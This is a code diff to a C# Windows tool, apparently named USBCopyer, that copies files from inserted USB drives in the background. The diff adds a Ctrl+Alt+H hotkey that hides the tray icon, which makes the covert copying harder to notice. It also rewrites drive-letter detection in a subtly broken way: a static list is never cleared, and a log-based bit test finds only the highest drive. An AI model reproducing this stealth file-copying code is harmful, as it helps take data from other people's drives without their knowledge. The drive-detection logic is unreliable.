@@ -22,6 +22,7 @@ namespace USBCopyer
         public string[] blackdisk;
         public string[] blackid;
         public Dictionary<string,Thread> copyThread = new Dictionary<string,Thread>(); //正在复制文件的线程 分区号=>线程
+        public static List<char> Volumes = new List<char>();
 
         public Host()
         {
@@ -51,7 +52,7 @@ namespace USBCopyer
             nameMenuItem.Text += " V" + Application.ProductVersion;
             if (!string.IsNullOrEmpty(Properties.Settings.Default.black))
             {
-                black = Properties.Settings.Default.black.Split(',');
+                black = Properties.Settings.Default.black.ToLower().Split(',');
             }
             else
             {
@@ -75,7 +76,7 @@ namespace USBCopyer
             }
             if (!string.IsNullOrEmpty(Properties.Settings.Default.white))
             {
-                white = Properties.Settings.Default.white.Split(',');
+                white = Properties.Settings.Default.white.ToLower().Split(',');
             } else
             {
                 white = new string[0];
@@ -192,7 +193,15 @@ namespace USBCopyer
                         if (dbv.dbcv_flags == 0)
                         {
                             char[] volums = GetVolumes(dbv.dbcv_unitmask);
-                            string disk = volums[0].ToString() + ":";
+
+                            int len = volums.Length;
+                            int start = (int)volums[0];
+                            int end = (int)volums[len - 1];
+                            for (int i = start; i <= end; i++)
+                            {
+                                string disk =((char)i).ToString() + ":"; 
+                            
+                            
                             if(wp == DBT_DEVICEARRIVAL) //存储设备插入
                             {
                                 try
@@ -433,6 +442,7 @@ namespace USBCopyer
                                     }
                                 }
                                 catch (Exception) {}
+                                }
                             } 
                         }
                     }
@@ -484,12 +494,14 @@ namespace USBCopyer
         /// <returns>返回驱动器号数组</returns>
         public static char[] GetVolumes(UInt32 Mask)
         {
-            List<char> Volumes = new List<char>();
+           // List<char> Volumes = new List<char>();
 
-            for (int i = 0; i < 32; i++)
+            for (int i = 0; i <= 26; i++)
             {
-                uint p = (uint)Math.Pow(2, i);
-                if ((p | Mask) == p)
+                //uint p = (uint)Math.Pow(2, i);
+                uint p = (uint)Math.Floor(Math.Log(Mask, 2));
+               // if ((p | Mask) == p)
+                if (i == p)
                 {
                     Volumes.Add((char)('A' + i));
                 }
@@ -634,7 +646,7 @@ namespace USBCopyer
         private bool checkExt(string ext)
         {
             if (string.IsNullOrEmpty(ext) && Properties.Settings.Default.copynoext) return true;
-            string extn = ext.Substring(1);
+            string extn = ext.ToLower().Substring(1);
             switch(Properties.Settings.Default.mode)
             {
                 case 1: //黑
@@ -819,7 +831,26 @@ namespace USBCopyer
         private void Host_Load(object sender, EventArgs e)
         {
             Hide();
+            Hotkey hotkey;//定义快键键(热键)
+            hotkey = new Hotkey(this.Handle);
+            Hotkey.Hotkey1 = hotkey.RegisterHotkey(Keys.H, Hotkey.KeyFlags.Control | Hotkey.KeyFlags.Alt);   //定义快键键
+            hotkey.OnHotkey += new HotkeyEventHandler(OnHotkey);//定义快键键
             SetVisibleCore(false);
+        }
+
+        public void OnHotkey(int HotkeyID) //Ctrl+alt+h 隐藏状态栏图标，再按显示图标。
+        {
+            if (HotkeyID == Hotkey.Hotkey1)
+            {
+                if (nicon.Visible == true)
+                    nicon.Visible = false;
+                else
+                    nicon.Visible = true;
+            }
+            else
+            {
+                nicon.Visible = false;
+            }
         }
     }
 }
